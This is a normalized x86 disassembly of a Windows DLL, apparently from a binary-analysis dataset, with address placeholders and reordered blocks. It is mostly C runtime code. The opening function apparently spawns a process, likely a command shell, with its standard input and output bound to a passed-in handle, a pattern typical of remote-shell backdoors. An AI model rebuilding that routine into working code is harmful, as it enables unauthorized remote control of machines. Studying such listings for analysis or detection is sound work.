mov eax [ esp + 0xc ]
cmp eax edi
je r-xdata
push eax
call esi
push eax
call esi
pop edi
pop esi
add esp 0x14
retn
sub_100025c0
sub esp 0x15c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x158 ] eax
mov eax [ esp + 0x160 ]
push ebx
mov ebx [ GetCurrentProcess@IAT ]
push esi
xor esi esi
push esi
push 0x1
mov [ esp + 0x48 ] eax
push 0x2
lea eax [ esp + 0x54 ]
push eax
mov [ esp + 0x18 ] 0x44
mov [ esp + 0x1c ] esi
mov [ esp + 0x24 ] esi
mov [ esp + 0x20 ] esi
mov [ esp + 0x34 ] esi
mov [ esp + 0x30 ] esi
mov [ esp + 0x2c ] esi
mov [ esp + 0x28 ] esi
mov [ esp + 0x48 ] si
mov [ esp + 0x4c ] esi
mov [ esp + 0x4a ] si
mov [ esp + 0x44 ] 0x101
mov [ esp + 0x54 ] edi
call ebx
push eax
push edi
call ebx
push eax
call [ DuplicateHandle@IAT ]
push 0x104
lea ecx [ esp + 0x60 ]
push ecx
push r--data
call [ GetEnvironmentVariableA@IAT ]
lea edx [ esp + 0x4c ]
push edx
lea eax [ esp + 0xc ]
push eax
push esi
push esi
push esi
push 0x1
push esi
push esi
lea ecx [ esp + 0x7c ]
push ecx
push esi
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x160 ]
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_100026a8
add esp 0x15c
retn
mov edx [ esp + 0x50 ]
mov esi [ esp + 0x4c ]
push edx
call [ CloseHandle@IAT ]
sub_100026c0
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
sub ecx 0x1
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
sub ebx 0x1
jne r-xdata
sub ebx 0x1
jne r-xdata
xor eax eax
mov [ edi ] al
add edi 0x1
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
sub ecx 0x1
jne r-xdata
add edi 0x4
xor eax eax
sub ecx 0x1
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_100027e4
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_1000452a
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_1000423e
mov [ esi ] eax
mov eax esi
pop esi
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_10003b2d
mov [ esi + 0x4 ] eax
sub_10002866
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
call sub_100049cb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
jmp r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x20 ]
call sub_100027e4
cmp esi ebx
je r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100026a8
leave
retn
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov esi [ ebp - 0x20 ]
cmp [ esi + 0x14 ] ebx
jne r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
push ebx
push ebx
push ebx
push 0xffffffff
push edi
push ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
push edi
call sub_10004850
pop ecx
jmp r-xdata
cmp [ esi + 0xac ] 0x1
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
call sub_100049cb
cmp [ ebp - 0x14 ] bl
mov [ eax ] 0x2a
je r-xdata
cmp [ ebp - 0x10 ] ebx
jne r-xdata
cmp [ ebp - 0x14 ] bl
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push ebx
push [ ebp + 0x10 ]
push [ ebp - 0x28 ]
push 0xffffffff
push edi
push ebx
push [ esi + 0x4 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx ebx
jbe r-xdata
cmp [ ebp - 0x14 ] bl
je r-xdata
cmp [ edi ] 0xff
ja r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
mov ecx [ ebp - 0x18 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x10 ] ebx
jne r-xdata
cmp [ ebp - 0x10 ] ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push ebx
push [ ebp + 0x10 ]
push [ ebp - 0x28 ]
push [ ebp + 0x10 ]
push edi
push ebx
push [ esi + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov eax edi
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ edi ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x24 ]
mov [ edx + eax ] cl
mov cx [ edi ]
inc edi
inc edi
test cx cx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
je r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
cmp [ ebp - 0x10 ] ebx
jne r-xdata
cmp ecx ebx
je r-xdata
inc eax
inc eax
dec ecx
jne r-xdata
inc eax
cmp eax [ ebp + 0x10 ]
mov [ ebp - 0x24 ] eax
jb r-xdata
cmp edi [ ebp + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x28 ]
cmp [ ecx + eax - 0x1 ] bl
jne r-xdata
cmp [ eax ] bx
jne r-xdata
cmp [ eax ] bx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push ebx
push [ esi + 0xac ]
lea eax [ ebp - 0xc ]
push eax
push 0x1
push [ ebp - 0x2c ]
push ebx
push [ esi + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
mov [ ebp - 0x24 ] eax
je r-xdata
cmp [ ebp - 0x14 ] bl
je r-xdata
jmp r-xdata
sub eax edi
sar eax 0x1
inc eax
mov [ ebp + 0x10 ] eax
cmp [ ebp - 0x10 ] ebx
jne r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
cmp eax ebx
jl r-xdata
cmp eax 0x5
ja r-xdata
lea ecx [ eax + edi ]
cmp ecx [ ebp + 0x10 ]
ja r-xdata
xor edx edx
cmp eax ebx
jle r-xdata
add [ ebp - 0x2c ] 0x2
mov cl [ ebp + edx - 0xc ]
cmp cl bl
mov eax [ ebp - 0x28 ]
mov [ eax + edi ] cl
je r-xdata
inc edx
inc edi
cmp edx [ ebp - 0x24 ]
jl r-xdata
sub_10002ac3
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100027e4
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
call sub_100049cb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push 0x8
push eax
call sub_10004b4b
add esp 0xc
jmp r-xdata
fldz
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ebp - 0x10 ]
push eax
push ebx
push ebx
push esi
call sub_10004ac0
pop ecx
push eax
lea eax [ ebp - 0x28 ]
push esi
push eax
call sub_10004a0f
fld [ eax + 0x10 ]
add esp 0x18
cmp [ ebp - 0x4 ] bl
je r-xdata
inc esi
jmp r-xdata
cmp eax ebx
je r-xdata
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10002b80
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp sub_10005366
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
add esi 0x1
cmp al dl
je r-xdata
mov al [ esi ]
add esi 0x1
cmp al dh
jne r-xdata
test al al
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
add esi 0x1
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
sub_10002c06
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
cmp ebx 0x4
push edi
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea edi [ ebx - 0x4 ]
test edi edi
jbe r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x4 ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop edi
inc eax
inc ecx
inc [ ebp - 0x4 ]
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] edi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
sub_10002cc4
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
cmp esi ebx
jne r-xdata
movzx eax [ esi ]
push eax
call sub_1000546f
inc esi
test eax eax
pop ecx
je r-xdata
call sub_100049cb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
xor eax eax
jmp r-xdata
mov eax esi
cmp [ esi ] bl
je r-xdata
pop esi
pop ebx
retn
inc esi
sub_10002d2f
push 0xc
push r--data
call sub_10005acc
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi ebx
setne al
cmp eax ebx
je r-xdata
call sub_100049cb
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000496c
add esp 0x14
xor eax eax
cmp [ esi ] bl
setne al
cmp eax ebx
je r-xdata
call sub_10005b11
retn
call sub_100059a5
mov [ ebp + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ edi ] bl
jne r-xdata
call sub_100049cb
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push esi
push edi
call sub_10005703
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10002de9
mov eax [ ebp - 0x1c ]
call sub_100049cb
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_10005cc8
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_10002e06
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
and eax 0xffffffef
cmp [ ebp + 0x10 ] 0x1
mov [ esi + 0xc ] eax
jne r-xdata
call sub_100049cb
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
push esi
call sub_10005f96
mov eax [ esi + 0xc ]
test al al
pop ecx
jns r-xdata
push esi
call sub_10002f12
add [ ebp + 0xc ] eax
and [ ebp + 0x10 ] 0x0
pop ecx
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_10005f69
pop ecx
push eax
call sub_10005e8d
xor ecx ecx
add esp 0xc
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
test al 0x8
je r-xdata
test ax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_10002e8d
push 0xc
push r--data
call sub_10005acc
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi esi
je r-xdata
call sub_100049cb
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_1000496c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1000565f
pop ecx
mov [ ebp - 0x4 ] esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10002e06
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10002f08
mov eax [ ebp - 0x1c ]
cmp edi 0x1
je r-xdata
call sub_10005b11
retn
cmp edi 0x2
jne r-xdata
sub_10002f12
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
push edi
call sub_10005f69
cmp [ edi + 0x4 ] ebx
pop ecx
mov [ ebp - 0x4 ] eax
jge r-xdata
call sub_100049cb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
push 0x1
push ebx
push eax
call sub_10005e8d
add esp 0xc
cmp eax ebx
mov [ ebp - 0x8 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
pop edi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test dx 0x108
jne r-xdata
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
push esi
mov esi eax
sub esi ecx
test dl 0x3
mov [ ebp - 0xc ] esi
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl dl
js r-xdata
mov esi [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
and esi 0x1f
imul esi esi 0x28
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
test [ edx + esi + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
call sub_100049cb
mov [ eax ] 0x16
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
add eax ecx
mov edx [ edi + 0x4 ]
cmp edx ebx
jne r-xdata
pop esi
inc edx
cmp edx esi
jb r-xdata
inc [ ebp - 0xc ]
xor ebx ebx
mov esi [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
and esi 0x1f
imul esi esi 0x28
sub eax ecx
add eax edx
sar ebx 0x5
lea ebx [ ebx * 4 + rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x80
je r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x8 ] eax
push 0x2
push 0x0
push [ ebp - 0x4 ]
call sub_10005e8d
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
push 0x0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_10005e8d
add esp 0xc
test eax eax
jge r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
jmp r-xdata
mov eax 0x200
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ edi + 0xc ] 0x2000
jmp r-xdata
inc [ ebp + 0x8 ]
test cx 0x400
je r-xdata
inc eax
inc [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x4
sub_100030aa
push 0xc
push r--data
call sub_10005acc
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_1000565f
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_10002f12
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000310e
mov eax [ ebp - 0x1c ]
call sub_100049cb
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_1000496c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_10005b11
retn
sub_10003118
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_100049cb
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_10005f96
push esi
mov ebx eax
call sub_10006598
push esi
call sub_10005f69
push eax
call sub_100064cb
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_100063a9
pop ecx
mov [ esi + 0x1c ] edi
sub_1000318b
push 0xc
push r--data
call sub_10005acc
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_100049cb
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_1000496c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_1000565f
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_10003118
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100031ff
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_10005b11
retn
mov eax [ ebp - 0x1c ]
sub_10003207
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0xc ]
imul eax [ ebp + 0x10 ]
test eax eax
push ebx
mov [ ebp - 0x8 ] eax
mov ebx eax
je r-xdata
pop ebx
leave
retn
push esi
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
mov [ ebp - 0x4 ] 0x1000
mov ecx [ esi + 0x18 ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
push edi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jb r-xdata
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
movsx eax [ eax ]
push esi
push eax
call sub_100065c4
cmp eax 0xffffffff
pop ecx
pop ecx
je r-xdata
test ecx ecx
je r-xdata
jl r-xdata
mov eax [ ebp - 0x8 ]
inc [ ebp + 0x8 ]
mov eax [ esi + 0x18 ]
dec ebx
test eax eax
mov [ ebp - 0x4 ] eax
jg r-xdata
cmp [ ebp - 0x4 ] 0x0
mov edi ebx
je r-xdata
push esi
call sub_10005f96
test eax eax
pop ecx
jne r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx edi
jae r-xdata
pop edi
pop esi
test ebx ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
push edi
push [ ebp + 0x8 ]
push esi
call sub_10005f69
pop ecx
push eax
call sub_10006cea
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor edx edx
mov eax ebx
div [ ebp - 0x4 ]
sub edi edx
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi ]
call sub_10006dd0
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp + 0x8 ] edi
jmp r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x20
cmp eax edi
mov ecx edi
ja r-xdata
add [ ebp + 0x8 ] ecx
sub ebx ecx
cmp eax edi
jae r-xdata
mov ecx eax
sub_10003321
push 0xc
push r--data
call sub_10005acc
mov eax [ ebp + 0xc ]
imul eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
xor eax eax
xor esi esi
cmp [ ebp + 0x14 ] esi
setne al
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
je r-xdata
call sub_100049cb
mov [ eax ] esi
push esi
push esi
push esi
push esi
push esi
call sub_1000496c
add esp 0x14
jmp r-xdata
call sub_10005b11
retn
push [ ebp + 0x14 ]
call sub_1000565f
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10003207
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100033a4
mov eax [ ebp - 0x1c ]
sub_100033ae
push 0xc
push r--data
call sub_10005acc
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_10005b11
retn
push 0x4
call sub_100072ab
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_10007af8
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100033f4
sub_100033fd
push ebp
mov ebp [ esp + 0x8 ]
cmp ebp 0xffffffe0
ja r-xdata
push ebp
call sub_100083cf
pop ecx
call sub_100049cb
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
push ebx
mov ebx [ HeapAlloc@IAT ]
push esi
push edi
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_1000838c
push 0x1e
call sub_100081ec
push 0xff
call sub_10007f4e
cmp eax 0x3
jne r-xdata
cmp ebp esi
je r-xdata
cmp ebp esi
jne r-xdata
push ebp
call sub_100033ae
cmp eax esi
pop ecx
jne r-xdata
xor eax eax
inc eax
mov eax ebp
jmp r-xdata
add edi 0xf
and edi 0xfffffff0
push edi
xor edi edi
inc edi
mov esi eax
test esi esi
jne r-xdata
push esi
push [ rw-data ]
call ebx
push eax
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] eax
push 0xc
pop edi
je r-xdata
call sub_100049cb
mov [ eax ] edi
push ebp
call sub_100083cf
test eax eax
pop ecx
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
mov edi ebp
jne r-xdata
jmp r-xdata
call sub_100049cb
mov [ eax ] edi
sub_100034ef
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
push 0x0
add eax 0x2ac18000
push 0x989680
adc ecx 0xfe624e21
push ecx
push eax
call sub_10008400
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
sub_1000352b
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
cmp eax 0x1
push ebx
push esi
push edi
jne r-xdata
xor edi edi
cmp eax edi
jne r-xdata
mov ebx [ GetProcessHeap@IAT ]
mov edi 0x94
push edi
push 0x0
call ebx
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jle r-xdata
push esi
mov [ esi ] edi
call [ GetVersionExA@IAT ]
test eax eax
push esi
push 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
call sub_1000438c
push 0x214
push 0x1
call sub_100084a8
mov esi eax
cmp esi edi
pop ecx
pop ecx
je r-xdata
dec [ rw-data ]
cmp [ rw-data ] edi
jne r-xdata
mov eax [ esi + 0x10 ]
mov edi [ esi + 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x4 ]
mov [ ebp + 0x10 ] eax
mov eax [ esi + 0x8 ]
mov [ ebp - 0x4 ] eax
and edi 0x7fff
call ebx
push eax
call [ HeapFree@IAT ]
mov eax [ ebp + 0xc ]
cmp eax 0x2
je r-xdata
call ebx
push eax
call [ HeapFree@IAT ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
xor eax eax
inc eax
push edi
call sub_10004663
pop ecx
push esi
push [ rw-data ]
push [ rw-data ]
call sub_10004320
pop ecx
call eax
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
call sub_10008191
mov ecx [ ebp - 0x4 ]
mov [ rw-data ] eax
mov eax [ ebp + 0x10 ]
mov edx eax
shl edx 0x8
add edx ecx
push 0x1
mov [ rw-data ] edx
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edi
call sub_10007e36
test eax eax
pop ecx
je r-xdata
or edi 0x8000
push esi
call sub_100063a9
pop ecx
jmp r-xdata
push edi
push esi
call sub_100043f3
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
call sub_1000635d
call sub_100043b6
call sub_10007e90
jmp r-xdata
call sub_100046cc
test eax eax
jne r-xdata
call sub_1000899c
call [ GetCommandLineA@IAT ]
